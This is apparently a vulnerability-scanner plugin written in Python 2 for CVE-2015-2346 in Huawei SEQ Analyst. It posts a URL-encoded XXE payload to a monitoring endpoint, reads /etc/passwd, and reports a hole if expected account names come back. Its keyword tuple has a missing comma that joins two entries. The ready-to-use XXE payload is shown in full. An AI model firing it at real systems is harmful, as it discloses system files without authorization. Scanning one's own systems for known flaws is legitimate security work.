#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'K0thony'
# Huawei SEQ Analyst - XML External Entity Injection (XXE)
#
# CVE-ID:

# CVE-2015-2346
# 可直接读取/etc/passwd文件

import urlparse
def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    url = arg + 'monitor/flexdata.action'
    payload = '<!DOCTYPE%20foo%20[<!ENTITY%20xxe00c70%20SYSTEM%20"file%3a%2f%2f%2fetc%2fpasswd">%20]><Req>%0a%20%20<command>bizLicenseSetting%26xxe00c70%3b<%2fcommand>%0a<%2fReq>&rdm=Tue%20Mar%203%2008%3A45%3A50%20GMT%2B0200%202015'
    keywords = ('bizLicenseSettingnobody',
                'daemon',
                'ftp',
                'root',
                'messagebus',
                'ntp',
                'ftpsecure',
                'sshd',
                'webserver',
                'ecmftp',
                'httpd',
                'cognos',
                'ftptrace'
                'ftpsoc')

    code, head, res, body, _ = curl.curl('-d %s %s' % (payload, url))
    if code == 200:
        flag=False
        for i in range(len(keywords)):
            if keywords[i] not in res:
                flag=True
                break#只要有一个key不在里面就不存在漏洞
        if flag==False:
            security_hole('Huawei SEQ Analyst - XML External Entity Injection XXE in %s' % url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('www', 'http://www.example.com/')[1])